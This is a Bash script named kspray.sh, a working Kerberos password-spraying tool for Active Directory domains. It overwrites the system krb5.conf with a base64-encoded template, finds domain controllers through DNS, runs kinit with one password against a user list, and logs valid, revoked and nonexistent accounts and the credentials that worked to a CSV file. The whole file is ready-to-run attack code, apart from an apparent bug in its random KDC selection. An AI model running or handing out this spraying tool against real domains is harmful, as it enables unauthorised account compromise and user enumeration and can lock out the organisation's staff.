#!/bin/bash
#####################################################################################
# Script: kspray.sh  |  By: John Harper
#####################################################################################
# kspray is useful on an untrusted/non-domain joined Kali host to perform:
# - Password spraying using kerberos
# - DC/KDC enumeration (KDCs are randomly selected for each authentication attempt)
# - User enumeration (Positively identifies users if you didn't already know them)
#####################################################################################

pathkinit="/usr/bin/kinit"

### Global Variables ###
readonly datetime=$(date +%Y%m%d_%H%M%S)
readonly reportKDC=Kspray-KDCs_$datetime.txt
readonly reportcreds=Kspray-Creds_$datetime.csv

# Color codes
YELLOW="\e[33m"
DARKGREEN="\e[32m"
GREEN="\e[32;1m"
BLUE="\e[94m"
RED="\e[91m"
WHITE="\e[37m"
NC="\e[0m"  # No color

# Function to display a title
display_title() {
  echo -e "${GREEN} "
  echo ICBfX19fX18gX18gICAgICAgICAgICAgICBfX19fX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogIF9fXyAgLy9fLyAgICAgICAgICAgICAgIF9fICBfX18vX19fX19fX19fX19fX19fX19fX18gX19fX18gIF9fCiAgX18gICw8ICAgICBfX19fX19fXyAgICAgX19fX18gXF9fXyAgX18gXF8gIF9fXy8gIF9fIGAvXyAgLyAvIC8KICBfICAvfCB8ICAgIF8vX19fX18vICAgICBfX19fLyAvX18gIC9fLyAvICAvICAgLyAvXy8gL18gIC9fLyAvIAogIC9fLyB8X3wgICAgICAgICAgICAgICAgIC9fX19fLyBfICAuX19fLy9fLyAgICBcX18sXy8gX1xfXywgLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgICAgICAgICAgICAgICAgICAvX19fXy8gICAK |base64 -d
  echo -e "${YELLOW}=================================================================="
  echo -e "${YELLOW} kspray.sh | [Version]: 2.0.0 | [Updated]: 10.27.2023"
  echo -e "${YELLOW}=================================================================="
  echo -e "${YELLOW} [By]: John Harper | [GitHub]: https://github.com/rollinz007"
  echo -e "${YELLOW}==================================================================${NC}"
  echo
}

# Function to check for root privilege
check_root() {
  if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Please run this script as root."
    exit 1
  fi
}

# Function to check the number of parameters
check_parameters() {
  if [ "$#" -ne 3 ]; then
    printf "\n"
    echo -e "${WHITE}   [Usage]: sudo ./kspray.sh [DOMAIN] [usernames.txt] [password]"
    echo -e "${WHITE} [Example]: sudo ./kspray.sh CORP.NET users.txt Spring2018"
    printf "\n"
    exit 1
  fi
}

# Function to check for the existence of kinit
check_kinit() {
  # Check for kerberos utilies, if exists, backup old krb5.conf and replace with sed version
  if [ ! -e "$pathkinit" ]; then
    echo -e "${RED}Missing kinit!"
    echo -e "${RED}Please run 'apt install krb5-user' to install it."
    echo -e "${WHITE}Expected Location: ${pathkinit} ${NC}"
    printf "\n"
    exit 1
  fi
  mv /etc/krb5.conf /etc/kspraykrb5.conf
  echo W2xpYmRlZmF1bHRzXQoJZGVmYXVsdF9yZWFsbSA9IEtTUFJBWURPTUFJTgoKIyBUaGUgZm9sbG93aW5nIGtyYjUuY29uZiB2YXJpYWJsZXMgYXJlIG9ubHkgZm9yIE1JVCBLZXJiZXJvcy4KCWtkY190aW1lc3luYyA9IDEKCWNjYWNoZV90eXBlID0gNAoJZm9yd2FyZGFibGUgPSB0cnVlCglwcm94aWFibGUgPSB0cnVlCgojIFRoZSBmb2xsb3dpbmcgZW5jcnlwdGlvbiB0eXBlIHNwZWNpZmljYXRpb24gd2lsbCBiZSB1c2VkIGJ5IE1JVCBLZXJiZXJvcwojIGlmIHVuY29tbWVudGVkLiAgSW4gZ2VuZXJhbCwgdGhlIGRlZmF1bHRzIGluIHRoZSBNSVQgS2VyYmVyb3MgY29kZSBhcmUKIyBjb3JyZWN0IGFuZCBvdmVycmlkaW5nIHRoZXNlIHNwZWNpZmljYXRpb25zIG9ubHkgc2VydmVzIHRvIGRpc2FibGUgbmV3CiMgZW5jcnlwdGlvbiB0eXBlcyBhcyB0aGV5IGFyZSBhZGRlZCwgY3JlYXRpbmcgaW50ZXJvcGVyYWJpbGl0eSBwcm9ibGVtcy4KIwojIFRoZSBvbmx5IHRpbWUgd2hlbiB5b3UgbWlnaHQgbmVlZCB0byB1bmNvbW1lbnQgdGhlc2UgbGluZXMgYW5kIGNoYW5nZQojIHRoZSBlbmN0eXBlcyBpcyBpZiB5b3UgaGF2ZSBsb2NhbCBzb2Z0d2FyZSB0aGF0IHdpbGwgYnJlYWsgb24gdGlja2V0CiMgY2FjaGVzIGNvbnRhaW5pbmcgdGlja2V0IGVuY3J5cHRpb24gdHlwZXMgaXQgZG9lc24ndCBrbm93IGFib3V0IChzdWNoIGFzCiMgb2xkIHZlcnNpb25zIG9mIFN1biBKYXZhKS4KCiMJZGVmYXVsdF90Z3NfZW5jdHlwZXMgPSBkZXMzLWhtYWMtc2hhMQojCWRlZmF1bHRfdGt0X2VuY3R5cGVzID0gZGVzMy1obWFjLXNoYTEKIwlwZXJtaXR0ZWRfZW5jdHlwZXMgPSBkZXMzLWhtYWMtc2hhMQoKIyBUaGUgZm9sbG93aW5nIGxpYmRlZmF1bHRzIHBhcmFtZXRlcnMgYXJlIG9ubHkgZm9yIEhlaW1kYWwgS2VyYmVyb3MuCglmY2MtbWl0LXRpY2tldGZsYWdzID0gdHJ1ZQoKW3JlYWxtc10KCUtTUFJBWURPTUFJTiA9IHsKCQlrZGMgPSBLU1BSQVlLREMKCQlhZG1pbl9zZXJ2ZXIgPSBLU1BSQVlLREMKCX0KCUFUSEVOQS5NSVQuRURVID0gewoJCWtkYyA9IGtlcmJlcm9zLm1pdC5lZHUKCQlrZGMgPSBrZXJiZXJvcy0xLm1pdC5lZHUKCQlrZGMgPSBrZXJiZXJvcy0yLm1pdC5lZHU6ODgKCQlhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5taXQuZWR1CgkJZGVmYXVsdF9kb21haW4gPSBtaXQuZWR1Cgl9CglaT05FLk1JVC5FRFUgPSB7CgkJa2RjID0gY2FzaW8ubWl0LmVkdQoJCWtkYyA9IHNlaWtvLm1pdC5lZHUKCQlhZG1pbl9zZXJ2ZXIgPSBjYXNpby5taXQuZWR1Cgl9CglDU0FJTC5NSVQuRURVID0gewoJCWFkbWluX3NlcnZlciA9IGtlcmJlcm9zLmNzYWlsLm1pdC5lZHUKCQlkZWZhdWx0X2RvbWFpbiA9IGNzYWlsLm1pdC5lZHUKCX0KCUlIVEZQLk9SRyA9IHsKCQlrZGMgPSBrZXJiZXJvcy5paHRmcC5vcmcKCQlhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5paHRmcC5vcmcKCX0KCTFUUy5PUkcgPSB7CgkJa2RjID0ga2VyYmVyb3MuMXRzLm9yZwoJCWFkbWluX3NlcnZlciA9IGtlcmJlcm9zLjF0cy5vcmcKCX0KCUFORFJFVy5DTVUuRURVID0gewoJCWFkbWluX3NlcnZlciA9IGtlcmJlcm9zLmFuZHJldy5jbXUuZWR1CgkJZGVmYXVsdF9kb21haW4gPSBhbmRyZXcuY211LmVkdQoJfQogICAgICAgIENTLkNNVS5FRFUgPSB7CiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvcy0xLnNydi5jcy5jbXUuZWR1CiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvcy0yLnNydi5jcy5jbXUuZWR1CiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvcy0zLnNydi5jcy5jbXUuZWR1CiAgICAgICAgICAgICAgICBhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5jcy5jbXUuZWR1CiAgICAgICAgfQoJREVNRU5USUEuT1JHID0gewoJCWtkYyA9IGtlcmJlcm9zLmRlbWVudGl4Lm9yZwoJCWtkYyA9IGtlcmJlcm9zMi5kZW1lbnRpeC5vcmcKCQlhZG1pbl9zZXJ2ZXIgPSBrZXJiZXJvcy5kZW1lbnRpeC5vcmcKCX0KCXN0YW5mb3JkLmVkdSA9IHsKCQlrZGMgPSBrcmI1YXV0aDEuc3RhbmZvcmQuZWR1CgkJa2RjID0ga3JiNWF1dGgyLnN0YW5mb3JkLmVkdQoJCWtkYyA9IGtyYjVhdXRoMy5zdGFuZm9yZC5lZHUKCQltYXN0ZXJfa2RjID0ga3JiNWF1dGgxLnN0YW5mb3JkLmVkdQoJCWFkbWluX3NlcnZlciA9IGtyYjUtYWRtaW4uc3RhbmZvcmQuZWR1CgkJZGVmYXVsdF9kb21haW4gPSBzdGFuZm9yZC5lZHUKCX0KICAgICAgICBVVE9ST05UTy5DQSA9IHsKICAgICAgICAgICAgICAgIGtkYyA9IGtlcmJlcm9zMS51dG9yb250by5jYQogICAgICAgICAgICAgICAga2RjID0ga2VyYmVyb3MyLnV0b3JvbnRvLmNhCiAgICAgICAgICAgICAgICBrZGMgPSBrZXJiZXJvczMudXRvcm9udG8uY2EKICAgICAgICAgICAgICAgIGFkbWluX3NlcnZlciA9IGtlcmJlcm9zMS51dG9yb250by5jYQogICAgICAgICAgICAgICAgZGVmYXVsdF9kb21haW4gPSB1dG9yb250by5jYQoJfQoKW2RvbWFpbl9yZWFsbV0KCS5taXQuZWR1ID0gQVRIRU5BLk1JVC5FRFUKCW1pdC5lZHUgPSBBVEhFTkEuTUlULkVEVQoJLm1lZGlhLm1pdC5lZHUgPSBNRURJQS1MQUIuTUlULkVEVQoJbWVkaWEubWl0LmVkdSA9IE1FRElBLUxBQi5NSVQuRURVCgkuY3NhaWwubWl0LmVkdSA9IENTQUlMLk1JVC5FRFUKCWNzYWlsLm1pdC5lZHUgPSBDU0FJTC5NSVQuRURVCgkud2hvaS5lZHUgPSBBVEhFTkEuTUlULkVEVQoJd2hvaS5lZHUgPSBBVEhFTkEuTUlULkVEVQoJLnN0YW5mb3JkLmVkdSA9IHN0YW5mb3JkLmVkdQoJLnNsYWMuc3RhbmZvcmQuZWR1ID0gU0xBQy5TVEFORk9SRC5FRFUKICAgICAgICAudG9yb250by5lZHUgPSBVVE9ST05UTy5DQQogICAgICAgIC51dG9yb250by5jYSA9IFVUT1JPTlRPLkNBCgo= |base64 -d > /tmp/kspraytmp.conf
  sudo mv /tmp/kspraytmp.conf /etc/krb5.conf
}

# Function to enumerate KDCs
enumerate_kdcs() {
  # UCASE user-supplied domain
  domain=$(echo $domain_in |awk '{print toupper($0)}')

  # Replace domain in krb5.conf
  sed -i 's/KSPRAYDOMAIN/'"$domain"'/g' /etc/krb5.conf

  # Enumerate KDCs
  nslookup -type=srv _kerberos._tcp.$domain |grep = |cut -d' ' -f6 |cut -d'.' -f1-3 > ${reportKDC}
  if [ ! -s "$reportKDC" ]; then
    echo -e "${RED} UNABLE TO GET KDC LIST!"
    echo -e "${WHITE} (1) Try running nslookup manually to validate DNS:"
    echo -e "${WHITE}  nslookup -type=srv _kerberos._tcp${domain}"
    echo -e "${WHITE} Modification may be required: /etc/hosts or /etc/resolv.conf (nm-connection-editor)"
    echo -e "${WHITE} (2) Check network connection"
    echo -e "${WHITE} (3) Possible, but unlikely, issue with your: /etc/krb5.conf"
    printf "\n"
  exit 1
  fi
}

# Remove any blank lines from provided username list
clean_users() {
  # Check if the userlist file exists
  if [ ! -f "$userlist" ]; then
    echo -e "${RED} Userlist file not found: $userlist"
    exit 1
  fi

  # Make a backup of original userlist
  listnotify=""
  directory=$(dirname "$userlist")
  filename=$(basename "$userlist")
  cleanuserlist="$directory/${filename%.*}_clean_${datetime}.${filename##*.}"
  cp "$userlist" "$cleanuserlist"

  # Fix case dups. Only keep unique names.
  sort -fu "$cleanuserlist" -o "$cleanuserlist"

  # Remove blank lines and lines with invalid characters in usernames. Characters allowed: A-Za-z0-9'.-_!#^~
  sed -i -e '/^[[:space:]]*$/d' -e '/[^A-Za-z0-9'\''\.\-_!#^~]/d' "$cleanuserlist"

  countOGusers=$(wc -l < "$userlist")
  countCleanusers=$(wc -l < "$cleanuserlist")

  if [ "$countOGusers" -eq "$countCleanusers" ]; then
    rm "$cleanuserlist"
    spraylist="$userlist"
  else
    listnotify="1"
    spraylist="$cleanuserlist"
  fi
}

# Function to process users from the file
process_users() {
  totalKDCs=$(wc -l $reportKDC |cut -d' ' -f1) # Get total KDC count
  previousKDC=KSPRAYKDC # Track previous KDC for future find and replace with awk
  usercount=0 # Start counting users sprayed. Count should match users in user-supplied file
  successcount=0 # Start counting valid credentials
  revokedcount=0 # Start counting revoked accounts
  badusercount=0 # Start counting bad user accounts
  badpasscount=0 # Start counting bad passwords for valid accounts

  while IFS= read -r username; do
    randomKDC=$(echo $((1 + random % $totalKDCs)))
    KDC=$(awk "NR==$randomKDC" $reportKDC)
    sed -i 's/'"$previousKDC"'/'"$KDC"'/g' /etc/krb5.conf
    command=$(echo $password | kinit $username@$domain 2>&1)

    ### Bad KDC ###
    if [[ $command == *"Cannot contact any KDC"* ]]; then
      echo -e "${RED} COULD NOT LOCATE $KDC IN THE $domain REALM!"
      exit 1

    ### Time Synchronization off ###
    elif [[ $command == *"not match expectations"* ]]; then
      echo -e "${RED} TIME SYNCHRONIZATION ERROR OR BAD KDC IN THE $domain REALM!"
      exit 1

    ### Revoked Account ###
    elif [[ $command == *"credentials have been revoked"* ]]; then
      echo -e "${RED} ACCOUNT IS REVOKED, LOCKED OUT, OR DISABLED!: $username"
      touch $reportcreds; echo "$username;$domain;$password;Revoked" >> $reportcreds
      ((revokedcount++))

    ### Account does not exist ###
    elif [[ $command == *"Client"* ]] && [[ $command == *"not found"* ]]; then
      echo -e "${RED} NON-EXISTENT USER: $username"
      touch $reportcreds; echo "$username;$domain;$password;Invaid Account" >> $reportcreds
      ((badusercount++))

    ### Woot! Got a hit ###
    elif [[ -e "/tmp/krb5cc_0" ]]; then
      echo -e "${WHITE} SUCCESS: $username@$domain : $password"
      touch $reportcreds; echo "$username;$domain;$password;Success" >> $reportcreds
      sudo rm /tmp/krb5cc_0
      ((successcount++))
      
    ### Password is incorrect ###
    else
      echo -e "${YELLOW} BAD PASSWORD: $username"
      touch $reportcreds; echo "$username;$domain;$password;Bad Password" >> $reportcreds
      ((badpasscount++))
    fi

    previousKDC="$KDC"
    ((usercount++))

  done < ${spraylist}
}

report() {
  runtime=$((end_time - start_time))
  seconds=$((runtime / 1000))
  milliseconds=$((runtime % 1000))
  minutes=$((seconds / 60))
  seconds=$((seconds % 60))
  validusercount=$(($usercount - $badusercount))

  printf "\n"
  echo -e "${DARKGREEN} ----------------------------------------"
  echo -e "${DARKGREEN} $usercount Account(s) Attempted with: ${YELLOW}${password}"
  echo -e "${GREEN} $successcount Account Hit(s)"
  echo -e "${GREEN} $validusercount Valid User Account(s) Enumerated${NC}"
  echo -e "${RED} $badpasscount Bad Password Attempt(s)"
  echo -e "${RED} $badusercount Bad User(s)"
  echo -e "${RED} $revokedcount Revoked Account(s)"
  printf "\n"
  echo -e "${WHITE} $totalKDCs Randomly Selected KDC(s) Utilized"
  echo -e ""
  echo -e "${BLUE} Script Runtime:" 
  echo -e "${WHITE} $minutes Minute(s), $seconds Second(s), and $milliseconds Millisecond(s)."
  echo -e "${DARKGREEN} ----------------------------------------${NC}"
  printf "\n"

  if [[ "$listnotify" == "1" ]]; then
    echo -e "${BLUE} Kspray created and used a cleaner version of your user list: ${YELLOW}${cleanuserlist}"
    echo -e "${WHITE} $countOGusers lines in ${directory}/${userlist}"
    echo -e "${WHITE} $countCleanusers  lines in ${cleanuserlist}"
    echo -e "${NC}"
  fi
}

cleanup() {
  # Put things back the way they were before the script ran
  mv /etc/kspraykrb5.conf /etc/krb5.conf
}

# Main script starts here

# Display the title
display_title

# Check for root privilege
check_root

# Check the number of parameters
check_parameters "$@"

domain_in=$1
userlist=$2
password=$3

# Check for the existence of kinit
check_kinit

# Enumerate KDCs
enumerate_kdcs

# Cleanup supplied users list
clean_users

# Start processing users from the file
start_time=$(date +%s%3N)  # Get the start time with milliseconds
process_users "$2" "$3"
end_time=$(date +%s%3N)  # Get the end time with milliseconds

report
cleanup